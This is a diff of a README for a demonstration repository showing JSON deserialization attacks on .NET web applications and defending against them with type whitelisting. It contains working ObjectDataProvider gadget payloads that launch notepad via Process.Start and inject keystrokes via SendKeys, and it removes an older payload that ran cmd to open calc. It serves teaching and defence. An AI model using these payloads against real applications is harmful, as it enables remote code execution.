@@ -1,35 +1,44 @@
 # JsonDeserialization
-Repository which shows how to protect against json deserialization attacks in dot net based web applications by whitelisting the types of models that will be binded.
-It has two parts:   
-Part 1 - Demonstration of JSON Deserialization attack by running Calculator and Command Prompt   
-Part 2 - Demonstration of securing against JSON Deserialization attacks by whitelisting the models that are allowed to bind.  
+Repository which shows how to protect against JSON deserialization attacks in .NET based web applications by whitelisting the types of models that will be binded and using type restrictions.
 
-## Getting Started
-These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. 
+## Credit
+This repository was forked from https://github.com/rishabhupreti/JsonDeserializationDotNet and modified to provide more examples.
 
 ## Prerequisites
-Dot Net Framework,  IDE like Visual Studio , NewtonSoft.Json Nuget Package
+* Visual Studio 2019 or greater
+* .NET Framework 4.7.2
 
 ## How to run this project?
-Just clone this project on your local machine and publish this project locally.
+Clone this project on your local machine and run the application through IIS Express.
 
-The project is a Dot Net based MVC web application which has a Home Controller.The Home Controller has two Action methods Secure Deserialization and
-Insecure Deserialization.
+The project is an ASP.NET MVC and Web API web application which has a Home controller (MVC) and Deserialize controller (Web API).
 
-## Insecure Deserialization (localhost/port_number/Home/InsecureDeserialization):-  
-In the deseriliazation settings, TypeNameHandling is set to all.The object that is deserialized is of the type System.Windows.Data.ObjectDataProvider which is used to spawn calculator and command prompt  
-to show the successful attack launch.
+## Payloads used for attacks
 
-## Secure Deserialization ((localhost/port_number/Home/SecureDeserialization))
-A whitelist of models is created that will be deserialized.In the deseriliazation settings, it is specified that only known types should be binded.  
-The web application will throw an exception when a type of object which is not in the whitelist is deserialized.
+```{
+    '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName': 'Start',
+    'MethodParameters':
+    {
+        '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values': [ 'notepad' ]
+    },
+    'ObjectInstance':
+    {
+        '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    }
+}```
 
-## Payload used for attack
-
-{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','MethodParameters':{'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','$values':['cmd','/ccalc']},'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}
-
-
-
-
-
-
+```{
+    '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName': 'SendWait',
+    'MethodParameters':
+    {
+        '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values': [ 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.' ]
+    },
+    'ObjectInstance':
+    {
+        '$type': 'System.Windows.Forms.SendKeys, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    }
+}```
